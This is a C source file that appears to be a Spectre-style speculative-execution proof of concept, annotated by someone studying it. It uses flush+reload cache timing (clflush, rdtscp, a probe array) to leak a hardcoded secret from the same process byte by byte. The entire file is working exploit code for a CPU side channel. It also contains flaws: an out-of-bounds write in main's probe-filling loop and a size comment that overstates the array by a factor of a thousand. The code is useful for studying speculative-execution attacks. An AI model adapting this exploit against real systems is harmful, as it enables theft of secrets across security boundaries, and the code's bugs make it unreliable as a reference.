#include <stdio.h>
#include <stdint.h>
#include <x86intrin.h>

#define LEN 16
#define ROUNDS 8
#define MAX_TRIES 10000
#define CACHE_HIT_THRESHOLD 100


unsigned char** memory_slot_ptr[256];
unsigned char* memory_slot[256];

unsigned char secret_key[] = "PASSWORD_SPECTRE";
unsigned char public_key[] = "################";

unsigned char sk2b512[] = "ef54a5e09fdd4bd7393ab1715ac5577dd886e8d6610ef9cb7375d501ef68b812f9a9292a0d5abce86d58edec32152bacfb918819ce45054f49361beff73933e3";
unsigned char pk2b512[] = "################################################################################################################################";

// 1 Gb
uint8_t probe[256 * 4096];
volatile uint8_t tmp = 0;


void victim_function(size_t idx) {
	unsigned char **memory_slot_slow_ptr = *memory_slot_ptr;
	*memory_slot_slow_ptr = pk2b512;
	tmp = probe[(*memory_slot)[idx] * 4096];
}

void attacker_function(int r) {
	char password[LEN + 1] = {'\0'};

	// For every potential byte in the password...
	for (int idx = 0; idx < LEN; ++idx) {

		// Instaniate a new "Cache Target" (ie; results)
		// 256byte int array, should move to const
		int results[256] = {0};
		unsigned int junk = 0;

		// For every potential try...
		for (int tries = 0; tries < MAX_TRIES; tries++) {

			// This part confuses me, as to it's purpose
			// They're reseting the pointers to the unsigned values
			*memory_slot_ptr = memory_slot;
			*memory_slot = sk2b512;
			
			// Very intereseting function indeed
			// _mm_clflush 
			// 	Invalidates from every level of the cache hierarchy in the cache coherence domain the cache line that contains the linear address specified with the memory operand.
			_mm_clflush(memory_slot_ptr);
			for (int i = 0; i < 256; i++) {
				_mm_clflush(&probe[i * 4096]);
			}
			_mm_mfence();
			victim_function(idx);
			for (int i = 0; i < 256; i++) {
				volatile uint8_t* addr = &probe[i * 4096];
				uint64_t time1 = __rdtscp(&junk); // read timer
				junk = *addr; // memory access to time
				uint64_t time2 = __rdtscp(&junk) - time1; // read timer and compute elapsed time
				if (time2 <= CACHE_HIT_THRESHOLD && i != pk2b512[idx]) {
					results[i]++; // cache hit
				}
			}
		}
		tmp ^= junk; // use junk so code above wonâ€™t get optimized out

		int highest = -1;
		for (int i = 0; i < 256; i++) {
			if (highest < 0 || results[highest] < results[i]) {
				highest = i;
			}
		}
		printf("round:%d, idx:%2d, highest:%c, hitrate:%f\n", r, idx, highest,
			(double)results[highest] * 100 / MAX_TRIES);
		password[idx] = highest;
	}
	printf("%s\n", password);
}


int main(void) {
	for (int r = 0; r < ROUNDS; ++r) {
		for (int i = 0; i < sizeof(probe); ++i) {
			probe[r+i] = 1; // write to array2 so in RAM not copy-on-write zero pages
		}
		attacker_function(r);
	}
}
